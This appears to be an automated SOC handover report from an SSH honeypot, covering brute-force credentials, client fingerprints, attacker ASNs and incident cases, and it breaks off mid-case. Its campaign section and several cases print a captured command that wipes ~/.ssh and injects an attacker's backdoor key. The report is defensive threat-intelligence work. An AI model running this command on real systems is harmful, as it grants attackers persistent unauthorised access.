# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-06-05 |
| **Generated At** | 2026-06-05T20:00:22Z |
| **Shift Time** | 20:00 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **174** |
| Confirmed Threats | **136** |
| False Positives Filtered | **38** (21.8%) |
| Unique Attacker IPs | **30** |
| Countries of Origin | **11** |
| High Severity Cases | **27** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **147** |
| Malware Samples Analyzed | **0** HIGH · **20** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **98** |
| Unique Credential Pairs | **74** |
| Unique Usernames | **58** |
| Unique Passwords | **64** |
| Successful Auth Pairs | **16** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 28 |
| `345gs5662d34` | 13 |
| `ubuntu` | 2 |
| `devuser` | 1 |
| `smile` | 1 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 13 |
| `3245gs5662d34` | 13 |
| `123456` | 10 |
| `cc` | 2 |
| `Aa123456` | 1 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 13 |
| `root` | `3245gs5662d34` | 13 |
| `devuser` | `123456` | 1 |
| `root` | `Aa123456` | 1 |
| `ubuntu` | `ubuntu2025!` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `Aa123456` | `213.55.79.194` | 2026-06-05T16:45:56 |
| `root` | `1234Qwer!` | `101.47.15.26` | 2026-06-05T17:13:26 |
| `root` | `3245gs5662d34` | `101.47.15.26` | 2026-06-05T17:13:29 |
| `root` | `1123581321` | `101.47.15.26` | 2026-06-05T17:25:10 |
| `root` | `Cj123456` | `101.47.15.26` | 2026-06-05T17:29:58 |
| `root` | `6666` | `101.47.15.26` | 2026-06-05T17:32:22 |
| `root` | `Ck123456@` | `101.47.15.26` | 2026-06-05T17:37:10 |
| `root` | `Aa@1234567` | `101.47.15.26` | 2026-06-05T17:39:27 |
| `root` | `Xx123456!` | `101.47.15.26` | 2026-06-05T17:44:08 |
| `root` | `root123*` | `101.47.15.26` | 2026-06-05T17:48:55 |
| `root` | `P@sswd!@#` | `101.47.15.26` | 2026-06-05T17:51:18 |
| `root` | `fabien` | `101.47.15.26` | 2026-06-05T17:53:43 |
| `root` | `cc` | `101.47.15.26` | 2026-06-05T18:05:09 |
| `root` | `Bb123456.` | `101.47.15.26` | 2026-06-05T18:13:41 |
| `root` | `qq11` | `156.239.224.79` | 2026-06-05T19:05:15 |
| `root` | `3245gs5662d34` | `156.239.224.79` | 2026-06-05T19:05:19 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **174** |
| Sessions with Fingerprint | **7** |
| Unique HASSH Fingerprints | **7** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 103 |
| Go SSH scanner | 3 |
| Unknown | 2 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 99 | 8 |
| `03a80b21afa8...` | Modern SSH client | 3 | 3 |
| `dd9bcf093c35...` | Mirai/variant | 2 | 2 |
| `0a07365cc01f...` | Generic scanner | 1 | 1 |
| `49255ec14315...` | Modern SSH client | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 99 | 8 | Mirai/variant |
| `03a80b21afa8...` | libssh | 3 | 3 | Modern SSH client |
| `dd9bcf093c35...` | Unknown | 2 | 2 | Mirai/variant |
| `0a07365cc01f...` | Go SSH scanner | 1 | 1 | Generic scanner |
| `49255ec14315...` | Go SSH scanner | 1 | 1 | Modern SSH client |
| `16443846184e...` | Go SSH scanner | 1 | 1 | Generic scanner |
| `af8223ac9914...` | libssh | 1 | 1 | libssh-based |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 13 | 2 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `156.239.224.79`, `101.47.15.26`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **30** |
| Unique ASNs | **23** |
| High-Risk ASNs | **17** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS137718` | Beijing Volcano Engine Technology Co., Ltd. | 2 | HIGH |
| `AS396982` | Google LLC | 2 | LOW |
| `AS4134` | CHINANET BACKBONE | 2 | HIGH |
| `AS4811` | China Telecom (Group) | 2 | HIGH |
| `AS8075` | Microsoft Corporation | 2 | HIGH |
| `AS138423` | CMPak Limited | 2 | HIGH |
| `AS398324` | Censys, Inc. | 2 | HIGH |
| `AS54994` | Meteverse Limited. | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (27)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-fde2db792ea1

| Field | Detail |
|---|---|
| **Source IP** | `213.55.79[.]194` |
| **First Seen** | 2026-06-05 16:45 |
| **Last Seen** | 2026-06-05 16:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uptime` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 16:45:55` | `cowrie.session.connect` |
| `2026-06-05 16:45:55` | `cowrie.client.version` |
| `2026-06-05 16:45:55` | `cowrie.client.kex` |
| `2026-06-05 16:45:56` | `cowrie.login.success` |
| `2026-06-05 16:45:56` | `cowrie.session.params` |
| `2026-06-05 16:45:56` | `cowrie.command.input` |
| `2026-06-05 16:45:56` | `cowrie.log.closed` |
| `2026-06-05 16:45:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.55.79[.]194` to AbuseIPDB if not already reported
- [ ] Block `213.55.79[.]194` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b51d053d5eb4

| Field | Detail |
|---|---|
| **Source IP** | `101.47.15[.]26` |
| **First Seen** | 2026-06-05 17:13 |
| **Last Seen** | 2026-06-05 17:13 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 17:13:26` | `cowrie.session.connect` |
| `2026-06-05 17:13:26` | `cowrie.client.version` |
| `2026-06-05 17:13:26` | `cowrie.client.kex` |
| `2026-06-05 17:13:26` | `cowrie.login.success` |
| `2026-06-05 17:13:26` | `cowrie.session.params` |
| `2026-06-05 17:13:26` | `cowrie.command.input` |
| `2026-06-05 17:13:26` | `cowrie.command.failed` |
| `2026-06-05 17:13:27` | `cowrie.log.closed` |
| `2026-06-05 17:13:27` | `cowrie.session.params` |
| `2026-06-05 17:13:27` | `cowrie.command.input` |
| `2026-06-05 17:13:27` | `cowrie.session.file_download` |
| `2026-06-05 17:13:27` | `cowrie.log.closed` |
| `2026-06-05 17:13:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.47.15[.]26` to AbuseIPDB if not already reported
- [ ] Block `101.47.15[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-222398570090

| Field | Detail |
|---|---|
| **Source IP** | `101.47.15[.]26` |
| **First Seen** | 2026-06-05 17:13 |
| **Last Seen** | 2026-06-05 17:13 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 17:13:28` | `cowrie.session.connect` |
| `2026-06-05 17:13:28` | `cowrie.client.version` |
| `2026-06-05 17:13:28` | `cowrie.client.kex` |
| `2026-06-05 17:13:29` | `cowrie.login.success` |
| `2026-06-05 17:13:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.47.15[.]26` to AbuseIPDB if not already reported
- [ ] Block `101.47.15[.]26` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d5e680d9cda9

| Field | Detail |
|---|---|
| **Source IP** | `101.47.15[.]26` |
| **First Seen** | 2026-06-05 17:25 |
| **Last Seen** | 2026-06-05 17:25 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 17:25:10` | `cowrie.session.connect` |
| `2026-06-05 17:25:10` | `cowrie.client.version` |
| `2026-06-05 17:25:10` | `cowrie.client.kex` |
| `2026-06-05 17:25:10` | `cowrie.login.success` |
| `2026-06-05 17:25:10` | `cowrie.session.params` |
| `2026-06-05 17:25:10` | `cowrie.command.input` |
| `2026-06-05 17:25:10` | `cowrie.command.failed` |
| `2026-06-05 17:25:11` | `cowrie.log.closed` |
| `2026-06-05 17:25:11` | `cowrie.session.params` |
| `2026-06-05 17:25:11` | `cowrie.command.input` |
| `2026-06-05 17:25:11` | `cowrie.session.file_download` |
| `2026-06-05 17:25:11` | `cowrie.log.closed` |
| `2026-06-05 17:25:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.47.15[.]26` to AbuseIPDB if not already reported
- [ ] Block `101.47.15[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9042f84944ee

| Field | Detail |
|---|---|
| **Source IP** | `101.47.15[.]26` |
| **First Seen** | 2026-06-05 17:25 |
| **Last Seen** | 2026-06-05 17:25 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 17:25:12` | `cowrie.session.connect` |
| `2026-06-05 17:25:12` | `cowrie.client.version` |
| `2026-06-05 17:25:12` | `cowrie.client.kex` |
| `2026-06-05 17:25:13` | `cowrie.login.success` |
| `2026-06-05 17:25:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.47.15[.]26` to AbuseIPDB if not already reported
- [ ] Block `101.47.15[.]26` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ad94b559ed2f

| Field | Detail |
|---|---|
| **Source IP** | `101.47.15[.]26` |
| **First Seen** | 2026-06-05 17:29 |
| **Last Seen** | 2026-06-05 17:30 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 17:29:57` | `cowrie.session.connect` |
| `2026-06-05 17:29:57` | `cowrie.client.version` |
| `2026-06-05 17:29:57` | `cowrie.client.kex` |
| `2026-06-05 17:29:58` | `cowrie.login.success` |
| `2026-06-05 17:29:58` | `cowrie.session.params` |
| `2026-06-05 17:29:58` | `cowrie.command.input` |
| `2026-06-05 17:29:58` | `cowrie.command.failed` |
| `2026-06-05 17:29:58` | `cowrie.log.closed` |
| `2026-06-05 17:29:58` | `cowrie.session.params` |
| `2026-06-05 17:29:58` | `cowrie.command.input` |
| `2026-06-05 17:29:58` | `cowrie.session.file_download` |
| `2026-06-05 17:29:58` | `cowrie.log.closed` |
| `2026-06-05 17:30:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.47.15[.]26` to AbuseIPDB if not already reported
- [ ] Block `101.47.15[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-661fdd51e25d

| Field | Detail |
|---|---|
| **Source IP** | `101.47.15[.]26` |
| **First Seen** | 2026-06-05 17:30 |
| **Last Seen** | 2026-06-05 17:30 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 17:30:00` | `cowrie.session.connect` |
| `2026-06-05 17:30:00` | `cowrie.client.version` |
| `2026-06-05 17:30:00` | `cowrie.client.kex` |
| `2026-06-05 17:30:00` | `cowrie.login.success` |
| `2026-06-05 17:30:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.47.15[.]26` to AbuseIPDB if not already reported
- [ ] Block `101.47.15[.]26` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c755ae054e14

| Field | Detail |
|---|---|
| **Source IP** | `101.47.15[.]26` |
| **First Seen** | 2026-06-05 17:32 |
| **Last Seen** | 2026-06-05 17:32 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 17:32:22` | `cowrie.session.connect` |
| `2026-06-05 17:32:22` | `cowrie.client.version` |
| `2026-06-05 17:32:22` | `cowrie.client.kex` |
| `2026-06-05 17:32:22` | `cowrie.login.success` |
| `2026-06-05 17:32:22` | `cowrie.session.params` |
| `2026-06-05 17:32:22` | `cowrie.command.input` |
| `2026-06-05 17:32:22` | `cowrie.command.failed` |
| `2026-06-05 17:32:22` | `cowrie.log.closed` |
| `2026-06-05 17:32:22` | `cowrie.session.params` |
| `2026-06-05 17:32:22` | `cowrie.command.input` |
| `2026-06-05 17:32:22` | `cowrie.session.file_download` |
| `2026-06-05 17:32:22` | `cowrie.log.closed` |
| `2026-06-05 17:32:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.47.15[.]26` to AbuseIPDB if not already reported
- [ ] Block `101.47.15[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cba59502cdad

| Field | Detail |
|---|---|
| **Source IP** | `101.47.15[.]26` |
| **First Seen** | 2026-06-05 17:32 |
| **Last Seen** | 2026-06-05 17:32 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 17:32:24` | `cowrie.session.connect` |
| `2026-06-05 17:32:24` | `cowrie.client.version` |
| `2026-06-05 17:32:24` | `cowrie.client.kex` |
| `2026-06-05 17:32:24` | `cowrie.login.success` |
| `2026-06-05 17:32:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.47.15[.]26` to AbuseIPDB if not already reported
- [ ] Block `101.47.15[.]26` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a400ab7df43c

| Field | Detail |
|---|---|
| **Source IP** | `101.47.15[.]26` |
| **First Seen** | 2026-06-05 17:37 |
| **Last Seen** | 2026-06-05 17:37 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 17:37:09` | `cowrie.session.connect` |
| `2026-06-05 17:37:09` | `cowrie.client.version` |
| `2026-06-05 17:37:09` | `cowrie.client.kex` |
| `2026-06-05 17:37:10` | `cowrie.login.success` |
| `2026-06-05 17:37:10` | `cowrie.session.params` |
| `2026-06-05 17:37:10` | `cowrie.command.input` |
| `2026-06-05 17:37:10` | `cowrie.command.failed` |
| `2026-06-05 17:37:10` | `cowrie.log.closed` |
| `2026-06-05 17:37:10` | `cowrie.session.params` |
| `2026-06-05 17:37:10` | `cowrie.command.input` |
| `2026-06-05 17:37:10` | `cowrie.session.file_download` |
| `2026-06-05 17:37:10` | `cowrie.log.closed` |
| `2026-06-05 17:37:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.47.15[.]26` to AbuseIPDB if not already reported
- [ ] Block `101.47.15[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2b147c550964

| Field | Detail |
|---|---|
| **Source IP** | `101.47.15[.]26` |
| **First Seen** | 2026-06-05 17:37 |
| **Last Seen** | 2026-06-05 17:37 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 17:37:12` | `cowrie.session.connect` |
| `2026-06-05 17:37:12` | `cowrie.client.version` |
| `2026-06-05 17:37:12` | `cowrie.client.kex` |
| `2026-06-05 17:37:12` | `cowrie.login.success` |
| `2026-06-05 17:37:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.47.15[.]26` to AbuseIPDB if not already reported
- [ ] Block `101.47.15[.]26` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d6907f95f72c

| Field | Detail |
|---|---|
| **Source IP** | `101.47.15[.]26` |
| **First Seen** | 2026-06-05 17:39 |
| **Last Seen** | 2026-06-05 17:39 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 17:39:27` | `cowrie.session.connect` |
| `2026-06-05 17:39:27` | `cowrie.client.version` |
| `2026-06-05 17:39:27` | `cowrie.client.kex` |
| `2026-06-05 17:39:27` | `cowrie.login.success` |
| `2026-06-05 17:39:27` | `cowrie.session.params` |
| `2026-06-05 17:39:27` | `cowrie.command.input` |
| `2026-06-05 17:39:27` | `cowrie.command.failed` |
| `2026-06-05 17:39:27` | `cowrie.log.closed` |
| `2026-06-05 17:39:27` | `cowrie.session.params` |
| `2026-06-05 17:39:27` | `cowrie.command.input` |
| `2026-06-05 17:39:28` | `cowrie.session.file_download` |
| `2026-06-05 17:39:28` | `cowrie.log.closed` |
| `2026-06-05 17:39:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.47.15[.]26` to AbuseIPDB if not already reported
- [ ] Block `101.47.15[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e537cccd3ddf

| Field | Detail |
|---|---|
| **Source IP** | `101.47.15[.]26` |
| **First Seen** | 2026-06-05 17:39 |
| **Last Seen** | 2026-06-05 17:39 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 17:39:29` | `cowrie.session.connect` |
| `2026-06-05 17:39:29` | `cowrie.client.version` |
| `2026-06-05 17:39:29` | `cowrie.client.kex` |
| `2026-06-05 17:39:29` | `cowrie.login.success` |
| `2026-06-05 17:39:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.47.15[.]26` to AbuseIPDB if not already reported
- [ ] Block `101.47.15[.]26` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c7824f844b20

| Field | Detail |
|---|---|
| **Source IP** | `101.47.15[.]26` |
| **First Seen** | 2026-06-05 17:44 |
| **Last Seen** | 2026-06-05 17:44 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
